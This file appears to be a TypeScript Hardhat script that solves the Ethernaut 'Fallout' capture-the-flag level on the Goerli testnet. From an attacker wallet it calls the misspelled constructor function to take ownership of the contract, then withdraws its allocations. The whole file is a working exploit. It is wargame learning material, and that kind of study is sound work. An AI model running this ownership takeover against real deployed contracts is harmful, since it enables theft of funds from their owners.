import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const abi = [
    "function Fal1out() public payable",
    "function collectAllocations() public"
]

const address = "0xB4EdEa8Fd2BdB7C8bfe4F378337BaB5083932976"
const contract = new ethers.Contract(address, abi, provider)

async function main() {
    let tx

    tx = await contract.connect(attacker).Fal1out()
    await tx.wait()

    tx = await contract.connect(attacker).collectAllocations()
    await tx.wait()

    console.log("Fallout: claimed ownership of the contract");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });